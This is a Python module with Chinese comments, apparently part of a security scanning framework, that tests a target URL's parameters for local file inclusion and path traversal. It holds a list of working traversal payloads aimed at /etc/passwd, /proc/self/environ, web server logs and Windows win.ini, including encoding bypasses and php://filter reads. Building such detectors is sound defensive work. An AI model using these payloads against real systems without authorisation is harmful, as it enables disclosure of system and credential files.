"""LFI 本地文件包含检测器"""
import time
import urllib.parse
from typing import List
from secops_core.http_client import http_get
from secops_core.config import ATTACK_DELAY
from secops_offense.attack_engine.finding import Finding
from secops_offense.attack_engine.auth import log_audit
from secops_offense.attack_engine.modules.base import BaseDetector


class LFIDetector(BaseDetector):
    """本地文件包含 / 路径穿越 检测器"""

    name = "lfi"
    category = "LFI"

    PAYLOADS_LINUX = [
        ("../../../../../../etc/passwd", "root:"),
        ("../../../../../../etc/passwd%00", "root:"),
        ("....//....//....//....//etc/passwd", "root:"),
        ("..%252f..%252f..%252f..%252fetc/passwd", "root:"),
        ("..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("file:///etc/passwd", "root:"),
        ("php://filter/read=convert.base64-encode/resource=/etc/passwd", "cm9vd"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
        ("/proc/self/environ", None),
        ("/var/log/apache2/access.log", None),
        ("/var/log/nginx/access.log", None),
    ]

    PAYLOADS_WINDOWS = [
        ("..\\..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("..\\..\\..\\..\\..\\..\\boot.ini", "[boot loader]"),
        ("c:\\windows\\win.ini", "[fonts]"),
        ("file:///c:/windows/win.ini", "[fonts]"),
    ]

    COMMON_PARAMS = [
        "file", "page", "path", "include", "inc", "dir",
        "template", "tpl", "doc", "document", "folder",
        "root", "pg", "style", "pdf", "lang", "language",
        "cmd", "ping", "query", "id", "name"
    ]

    def test(self, target_url: str, params: list = None) -> List[Finding]:
        findings = []
        parsed = urllib.parse.urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        if params is None:
            if parsed.query:
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            else:
                params = self.COMMON_PARAMS

        for param in params:
            for payload, expected in self.PAYLOADS_LINUX:
                test_params = {param: payload}
                test_url = f"{base_url}?{urllib.parse.urlencode(test_params)}"

                log_audit("LFI_TEST", test_url, f"param={param}")
                status, headers, body = http_get(test_url)

                if status == 0:
                    continue

                if expected and expected in body and payload not in body:
                    findings.append(Finding(
                        vuln_type="LFI", severity="critical",
                        title=f"本地文件包含 - 参数 {param}",
                        location=test_url, payload=payload,
                        evidence=f"文件内容泄露: 包含 '{expected}' 关键字",
                        description=f"参数 {param} 存在本地文件包含漏洞。",
                        remediation="禁止用户输入控制文件路径，使用白名单校验"
                    ))
                    break

                time.sleep(ATTACK_DELAY)

        return findings
